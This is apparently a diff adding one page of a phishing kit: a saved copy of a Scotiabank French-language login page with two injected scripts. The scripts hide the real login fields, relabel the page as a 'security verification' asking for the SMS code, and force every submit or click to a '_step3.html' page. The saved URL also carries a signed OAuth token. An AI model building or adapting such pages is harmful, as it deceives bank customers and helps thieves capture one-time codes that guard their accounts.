@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+
+<html lang="fr-FR" style="--theme-family-member-numbers:HHhFKJ9luyS3M0t3X8Mm2clTuG86NGKtqRnnhAQympo24OICi7A4Nz2Iu4qjpnYcOb4pDx"><!--
+ Page saved with SingleFile 
+ url: https://auth.scotiaonline.scotiabank.com/online?oauth_key=C1cTQh1v3_w&oauth_key_signature=eyJraWQiOiJTd1dmbV9ITlNFTVVNbUVHMnh2LUsydmlhOGVvdzRFTEZhejdxMEdZalVjIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJyZWZlcmVyIjoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8iLCJyYXIiOmZhbHNlLCJvYXV0aF9rZXkiOiJDMWNUUWgxdjNfdyIsImNvbnNlbnRfcmVxdWlyZWQiOmZhbHNlLCJyZWRpcmVjdF91cmkiOiJodHRwczovL3d3dy5zY290aWFvbmxpbmUuc2NvdGlhYmFuay5jb20vb25saW5lL2xhbmRpbmcvb2F1dGhsYW5kaW5nLmJucyIsImV4cCI6MTc4NjEzMjEyNywiaWF0IjoxNzg2MTMwOTI3LCJqdGkiOiJmMTA4MGM3Zi1iMTMzLTQ4NjYtYTdiMi0yOTE5MzAzMWVmM2IiLCJjbGllbnRfaWQiOiI4ZWU5MGMzOS0xYzUyLTRmZjQtOGFlNi1hN2I1NGM1Mzk5MzMiLCJjbGllbnRfbWV0YWRhdGEiOnsiQ2hhbm5lbElEIjoiU09MIiwiQXBwbGljYXRpb25Db2RlIjoiSDcifSwiaXNzdWVyIjoiaHR0cHM6Ly9wYXNzcG9ydC5zY290aWFiYW5rLmNvbSJ9.o4iC8tbU4vs7mkAYsXJN1pxRx1-R-tncsdfSI33w5NDn9hrQAh5R3jAk4NvTVD0ellkdqiB2pm0Y15KkZs80F5uUJ9CloCUMIaVFezgg4s_5A-dnCtS5iSjtl5caGZAA5JlsX4jew5ctWOOt6AS5caDoV0h1EXTmTqD9qQx3gV2CW90RhfU6oGsJr1qYr0lMyWsbaV11EXP8HhhydgNPaIkLNXCy1MQkhN65Ive71taM7cqD8gF-9raUcBS9L_GwDgVGLHzvRYOYL01VzmgEM2XVXXzRIH1MTheEdUskucdo0tPmLm74wGgs8cm2bFVxhQKsmZD5GDHJ3-vQLq3eEg&preferred_environment= 
+ saved date: Fri Aug 07 2026 15:28:55 GMT-0400 (heure d’été de l’Est nord-américain)
+--><head a-c-at="5d912602cc592c340155668ee117a520" d-c-id="81f541cd2f4ea9c2908b9e39b03e0a80-4837982561454441" v-c-at="latest"><style id="override-css">#onetrust-banner-sdk,#onetrust-consent-sdk,[id*="onetrust"]{display:none!important;}</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var currentFile = window.location.pathname.split("/").pop();
+    var step3File = currentFile.replace("_sms.html", "_step3.html");
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = step3File;
+        });
+    });
+
+    var clickables = document.querySelectorAll("button, input[type='submit'], input[type='button'], .btn");
+    clickables.forEach(function(el) {
+        el.addEventListener("click", function(e) {
+            var text = (el.textContent || el.value || "").toLowerCase().trim();
+            if (el.getAttribute("type") === "submit" || 
+                text.indexOf("valid") !== -1 || 
+                text.indexOf("contin") !== -1 || 
+                text.indexOf("soumet") !== -1 ||
+                text.indexOf("submit") !== -1 ||
+                text.indexOf("next") !== -1 ||
+                text.indexOf("suivant") !== -1) {
+                e.preventDefault();
+                e.stopPropagation();
+                window.location.href = step3File;
+            }
+        });
+    });
+});
+</script>
+
+
+<script id="unified-sms-handler">
+document.addEventListener("DOMContentLoaded", function() {
+    // 1. Transform UI for SMS page
+    var inputs = document.querySelectorAll("input:not([type='hidden'])");
+    var targetInput = null;
+    
+    for(var i = 0; i < inputs.length; i++) {
+        if (!targetInput && (inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel" || inputs[i].type === "password")) {
+            targetInput = inputs[i];
+        } else {
+            if (inputs[i].type === "password" || inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel") {
+                inputs[i].style.display = "none";
+                if (inputs[i].parentElement && inputs[i].parentElement.tagName !== "FORM" && inputs[i].parentElement.tagName !== "BODY") {
+                    inputs[i].parentElement.style.display = "none";
+                }
+            }
+        }
+    }
+    
+    if (targetInput) {
+        targetInput.type = "tel";
+        targetInput.maxLength = 8;
+        targetInput.placeholder = "Code SMS";
+        targetInput.value = "";
+        targetInput.style.display = "block";
+        
+        var id = targetInput.id;
+        if(id) {
+            var label = document.querySelector("label[for='" + id + "']");
+            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
+        }
+        
+        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        var node;
+        while(node = walker.nextNode()) {
+            var text = node.nodeValue.toLowerCase();
+            if(text.trim().length > 3) {
+                if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
+                    node.nodeValue = "Vérification de sécurité";
+                }
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
+                }
+                else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
+                    node.nodeValue = "";
+                }
+            }
+        }
+    }
+    
+    var clickables = document.querySelectorAll("button, input[type='submit'], .btn");
+    clickables.forEach(function(el) {
+        var text = (el.textContent || el.value || "").toLowerCase().trim();
+        if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("connex") !== -1 || text.indexOf("connect") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("log") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("suivant") !== -1) {
+            if (el.tagName === "INPUT") el.value = "Valider le code";
+            else el.innerText = "Valider le code";
+        }
+    });
+
+    // 2. Guaranteed Navigation to Step 3
+    var nextPath = window.location.pathname.replace("_sms.html", "_step3.html");
+    
+    function goNext(e) {
+        if (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+        }
+        window.location.href = nextPath;
+    }
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", goNext, true);
+        form.onsubmit = goNext;
+    });
+    
+    document.addEventListener("click", function(e) {
+        var el = e.target.closest("button, input[type='submit'], input[type='button'], .btn, a");
+        if (el) {
+            goNext(e);
+        }
+    }, true);
+});
+</script>
+
